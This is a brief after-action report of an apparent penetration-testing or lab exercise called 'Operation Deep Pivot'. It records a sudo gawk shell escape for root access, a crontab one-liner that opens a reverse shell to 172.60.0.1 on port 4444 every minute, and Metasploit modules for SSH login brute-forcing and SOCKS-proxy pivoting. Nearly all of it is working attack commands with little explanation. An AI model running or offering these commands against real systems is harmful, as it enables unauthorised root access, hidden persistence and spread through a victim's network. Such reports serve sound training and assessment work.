# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/gawk
* **GTFOBins Exploit Command Used:** sudo gawk 'BEGIN {system("/bin/bash")}'

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'") | crontab -
* **Persistence Confirmed:** (Yes)

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** auxiliary/scanner/ssh/ssh_login
post/multi/manage/autoroute
auxiliary/server/socks_proxy
